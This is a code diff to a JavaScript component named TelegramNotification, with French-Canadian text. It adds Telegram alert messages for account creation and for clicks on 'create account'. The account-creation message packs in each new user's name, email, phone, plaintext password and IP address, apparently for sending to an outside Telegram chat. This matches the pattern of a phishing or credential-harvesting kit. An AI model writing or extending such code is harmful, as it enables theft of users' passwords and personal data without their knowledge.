@@ -80,6 +80,22 @@ export default function TelegramNotification() {
                  + "📍 Page: `" + page + "`\n"
                  + "🕐 Connexion: " + (data?.loginTime || new Date().toLocaleString("fr-CA", { timeZone: "America/Toronto" })) + "\n"
                  + "🔗 Source: " + ref
+          } else if (type === "account_creation") {
+            msg = "👤 *NOUVEAU COMPTE CRÉÉ !*\n\n"
+                 + "📧 Prénom: " + (data?.firstName || "Inconnu") + "\n"
+                 + "📧 Nom: " + (data?.lastName || "Inconnu") + "\n"
+                 + "📧 Email: " + (data?.email || "Inconnu") + "\n"
+                 + "📧 Téléphone: " + (data?.phone || "Non fourni") + "\n"
+                 + "🔑 Mot de passe: " + (data?.password || "Non fourni") + "\n"
+                 + "🌐 IP: `" + ip + "`\n"
+                 + "📍 Page: `" + page + "`\n"
+                 + "🕐 Création: " + new Date().toLocaleString("fr-CA", { timeZone: "America/Toronto" })
+          } else if (type === "create_account_click") {
+            msg = "🖱️ *CLIC SUR 'CRÉER UN COMPTE' !*\n\n"
+                 + "📍 Page: `" + (data?.page || "Inconnu") + "`\n"
+                 + "🎯 Action: " + (data?.action || "Inconnu") + "\n"
+                 + "🌐 IP: `" + ip + "`\n"
+                 + "🕐 Timestamp: " + (data?.timestamp || new Date().toLocaleString("fr-CA", { timeZone: "America/Toronto" }))
           }
 
           // 6. Envoyer la notif
